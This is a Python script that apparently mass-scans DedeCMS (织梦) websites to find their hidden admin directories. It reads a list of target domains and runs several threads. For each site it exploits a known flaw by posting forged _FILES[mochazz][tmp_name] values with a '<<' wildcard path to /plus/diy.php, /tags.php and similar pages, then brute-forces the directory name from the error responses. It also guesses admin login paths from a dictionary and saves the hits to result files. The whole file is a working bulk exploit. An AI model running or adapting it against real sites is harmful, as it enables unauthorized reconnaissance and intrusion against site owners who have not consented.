import itertools
import traceback
from common import utils
from threading import Thread
import time
import re

characters = "abcdefghijklmnopqrstuvwxyz0123456789_!#"
base_back_dict = utils.get_lines("./dict/织梦后台字典.txt")


def try_common(domain):
    back_dir_dict = []
    s = domain.replace("http://", "").replace("https://","")
    n = len(s.split("."))
    if n == 2:
        path = s.split(".")[0]
        back_dir_dict = [path, "admin_%s" % path, "dede_%s" % path, "ad_%s" % path, "bk_%s" % path,
                         "background_%s" % path, "houtai_%s" % path, "%s_admin" % path, "%s_dede" % path,
                         "%s_ad" % path, "%s_bk" % path, "%s_background" % path, "%s_houtai" % path]
    if n >= 3:
        for path in s.split(".")[:n - 1]:
            back_dir_dict = [path, "admin_%s" % path, "dede_%s" % path, "ad_%s" % path, "bk_%s" % path,
                             "background_%s" % path, "houtai_%s" % path, "%s_admin" % path, "%s_dede" % path,
                             "%s_ad" % path, "%s_bk" % path, "%s_background" % path, "%s_houtai" % path]
    back_dir_dict.extend(base_back_dict)
    for back_dir in back_dir_dict:
        print(domain + "/"+back_dir + "/login.php")
        res = utils.my_requests(domain + "/"+back_dir + "/login.php",try_count=2)
        if res and res.status_code == 200 and "login.php" in res.url:
            res = {"domain": domain, "res": True, "info": back_dir}
            ress.append(res)
            return res
    pass


def get_back_url(domain):
    back_dir = ""
    flag = 0
    target_url = ""
    up_path = "./../{p}<</images/adminico.gif"
    data = {
        "_FILES[mochazz][tmp_name]": up_path,
        "_FILES[mochazz][name]": 0,
        "_FILES[mochazz][size]": 0,
        "_FILES[mochazz][type]": "image/gif"
    }
    site_files = ["/plus/diy.php", "/plus/list.php", "/plus/feedback.php", "/plus/count.php", "/tags.php"]
    try:
        for site_file_path in site_files:
            url = domain + site_file_path
            res = utils.my_requests(url)
            if res and res.status_code == 200:
                target_url = domain + site_file_path
                if site_file_path == "/tags.php":
                    up_path = "./{p}<</images/adminico.gif"
                    data.update({"_FILES[mochazz][tmp_name]": up_path})
                break
        else:
            res = {"domain": domain, "res": False, "info": "找不到上传路径"}
            ress.append(res)
            return res
        for num in range(1, 3):
            if flag:
                break
            for pre in itertools.permutations(characters, num):
                pre = ''.join(list(pre))
                # if pre == "my":
                #     print("1")
                data["_FILES[mochazz][tmp_name]"] = data["_FILES[mochazz][tmp_name]"].format(p=pre)
                print("testing", pre)
                r = utils.my_requests(target_url, method="post", data=data)
                data["_FILES[mochazz][tmp_name]"] = up_path
                if "Upload filetype not allow !" not in r.text and r.status_code == 200:
                    flag = 1
                    back_dir = pre
                    break
        if not flag:
            res = {"domain": domain, "res": False, "info": "没找到"}
            ress.append(res)
            return res
        print("[+] 前缀为：", back_dir)
        flag = 0
        for i in range(len(characters)):
            if flag:
                break
            for ch in characters:
                if back_dir == "aaaa":
                    res = {"domain": domain, "res": False, "info": "循环错误"}
                    ress.append(res)
                    return res
                if ch == characters[-1]:
                    flag = 1
                    break
                data["_FILES[mochazz][tmp_name]"] = data["_FILES[mochazz][tmp_name]"].format(p=back_dir + ch)
                r = utils.my_requests(target_url, method="post", data=data)
                data["_FILES[mochazz][tmp_name]"] = up_path
                if "Upload filetype not allow !" not in r.text and r.status_code == 200:
                    back_dir += ch
                    print("%s[+]"%domain, back_dir)
                    # print("后台地址为：", domain+"/"+back_dir)
                    break
        res = {"domain": domain, "res": True, "info": back_dir}
        print("后台地址为：", domain + "/" + back_dir)
        ress.append(res)
        return res
    except Exception as e:
        traceback.print_exc()
        res = {"domain": domain, "res": False, "info": "未知错误"}
        ress.append(res)
        return res


def task():
    while domains:
        domain = domains.pop()
        domain = utils.format_domain(domain, True)
        res = None
        res = get_back_url(domain)
        if not res or not res["res"]:
            try_common(domain)
        if not domains:
            break


def 批量爆破织梦后台(t_num):
    for n in range(t_num):
        print("线程%d启动" % n)
        t = Thread(target=task)
        t.start()
        ts.append(t)
    for t in ts:
        t.join()
    print("结果")
    print(ress)


if __name__ == '__main__':
    # 线程数
    t_num = 1
    ts = []
    domains = utils.get_lines("./target/批量爆破织梦后台")
    # 结果集
    ress = []
    # get_back_url("dede.local.com")
    批量爆破织梦后台(t_num)
    with open(file="./res/批量爆破织梦后台_成功.txt", mode="a", encoding="utf-8") as fp:
        fp.write("\n\n\n扫描结果:%s\n\n" % str(time.time()))
        for res in ress:
            if res["res"]:
                fp.write("后台目录:%s/%s\n" % (res["domain"], res["info"]))
    with open(file="./res/批量爆破织梦后台_失败.txt", mode="a", encoding="utf-8") as fp:
        fp.write("\n\n\n扫描结果:%s\n\n" % str(time.time()))
        for res in ress:
            if not res["res"]:
                fp.write("%s:%s\n" % (res["info"], res["domain"]))
        # fp.writelines("\n".join(ress))
